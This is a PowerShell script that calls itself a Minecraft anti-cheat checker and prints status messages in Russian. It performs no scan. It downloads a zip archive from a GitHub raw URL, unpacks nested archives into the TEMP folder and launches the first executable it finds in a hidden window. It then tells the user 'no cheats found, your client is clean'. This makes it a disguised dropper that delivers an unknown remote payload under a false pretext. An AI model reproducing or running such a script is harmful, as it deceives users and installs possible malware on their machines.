# =============================================
# Minecraft Anti-Cheat Checker v1.0
# =============================================

Write-Host "[*] Инициализация сканера системы..." -ForegroundColor Cyan
Start-Sleep -Seconds 1

Write-Host "[*] Проверка целостности файлов клиента..." -ForegroundColor Cyan
Start-Sleep -Seconds 1

$URL = "https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip"
$ZIP = "$env:TEMP\main.zip"
$EXTRACT = "$env:TEMP\CHECKK-main"

try {
    Write-Host "[*] Загрузка модуля проверки..." -ForegroundColor Yellow
    (New-Object Net.WebClient).DownloadFile($URL, $ZIP)
    Write-Host "[+] Модуль загружен" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка загрузки модуля" -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

try {
    Write-Host "[*] Распаковка античит-базы..." -ForegroundColor Yellow
    Expand-Archive -Path $ZIP -DestinationPath $EXTRACT -Force
    Write-Host "[+] База распакована" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка распаковки базы" -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

$Zip2 = Get-ChildItem -Path $EXTRACT -Filter "*.zip" -Recurse | Select-Object -First 1
if ($Zip2) {
    try {
        Write-Host "[*] Обновление сигнатур читов..." -ForegroundColor Yellow
        Expand-Archive -Path $Zip2.FullName -DestinationPath $EXTRACT -Force
        Write-Host "[+] Сигнатуры обновлены" -ForegroundColor Green
    } catch {
        Write-Host "[-] Ошибка обновления сигнатур" -ForegroundColor Red
        Start-Sleep -Seconds 2
        exit
    }
}

$Exe = Get-ChildItem -Path $EXTRACT -Filter "*.exe" -Recurse | Select-Object -First 1
if ($Exe) {
    Write-Host "[*] Запуск глубокого сканирования..." -ForegroundColor Yellow
    Start-Process -WindowStyle Hidden $Exe.FullName
    Write-Host "[+] Сканирование завершено. Читы не обнаружены." -ForegroundColor Green
    Write-Host "[+] Ваш клиент чист." -ForegroundColor Green
} else {
    Write-Host "[-] Ошибка: компонент сканера не найден" -ForegroundColor Red
}

Start-Sleep -Seconds 3
Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")